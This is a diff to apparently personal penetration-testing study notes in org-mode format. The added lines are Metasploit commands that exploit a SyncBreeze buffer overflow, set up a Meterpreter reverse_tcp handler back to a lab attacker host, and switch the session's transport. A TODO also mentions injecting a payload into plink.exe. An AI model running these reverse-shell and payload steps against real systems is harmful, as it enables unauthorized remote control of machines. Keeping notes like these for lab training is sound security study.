@@ -2741,10 +2741,30 @@ msf5 exploit(multi/handler) > sessions -i 5
 **** protocol transport (e.g. TCP to HTTPs after compromise)
      + src:
      #+begin_src meterpreter
-meterpreter > transport list
 meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555
+  # add a new transport protocol to the current meterpreter session
+  # -l <localHost> -p <localPort>
+meterpreter > transport list
+meterpreter > background
+msf5 exploit(windows/http/syncbreeze_bof) > sessions -l
+msf5 exploit(windows/http/syncbreeze_bof) > use multi/handler
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 10.11.0.4
+msf5 exploit(multi/handler) > set LPORT 5555
+msf5 exploit(multi/handler) > run -j
+msf5 exploit(multi/handler) > sessions -i 5
+meterpreter > transport next
+  # ...
+  # [+] Successfully changed to the next transport, killing current session.
+  # ...
+  # [*] Meterpreter session 6 opened (10.11.0.4:5555 -> 10.11.0.22:50357)
+msf5 exploit(multi/handler) > sessions -i 6
+  # protocol transported.
      #+end_src
-    
+     + TODO injected a payload to *plink.exe* and test.
+       
+** Building Our Own MSF Module
+
 
 * TODO list
   + AD, LDAP enum users
